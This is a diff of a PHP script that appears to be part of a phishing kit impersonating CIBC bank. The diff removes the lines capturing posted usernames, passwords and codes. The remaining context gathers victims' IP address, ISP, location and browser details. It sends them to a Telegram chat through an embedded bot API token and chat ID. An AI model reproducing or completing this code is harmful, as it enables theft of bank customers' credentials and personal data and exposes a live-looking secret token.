@@ -1,4 +1,4 @@
-=<?php
+<?php
 
 header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
 header("X-XSS-Protection: 0");
@@ -37,9 +37,6 @@ if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
     echo $response;
     exit;
 }
-
-
-
 
 $full_date = date("h:i:s|M/d/Y");
 $time = date("h:i:s");
@@ -179,11 +176,7 @@ if ($success==false) {
     $crn        = $details['currency'];
     $type       = $tp;
     $bank       = "CIBC";
-
     $url        = "https://CIBC.com";
-    $user       = $_POST['username'];
-    $pass       = $_POST['password'];
-    $code       = $_POST['code']; 
 	$lh     = "|";
     $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
     $isp        = $is;
@@ -191,7 +184,6 @@ if ($success==false) {
     $li     = ",";
 
     
-
 } else {
     $status     = "Status : ".$success;
     fwrite($fp, $status."\n");
@@ -199,10 +191,7 @@ if ($success==false) {
     fclose($fp);
 }
 
-
-
 $message =" $bank$lh$ip\n\n-----------------\n\n$bsr$lh$uos\n\n-----------------\n\n$is\n\n-----------------\n\n$city$lh$country\n\n-----------------\n\n$la$li$lp\n\n-----------------\n\n$uaget";
-
 $apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
 $data = [
     'chat_id' => '-821080105',
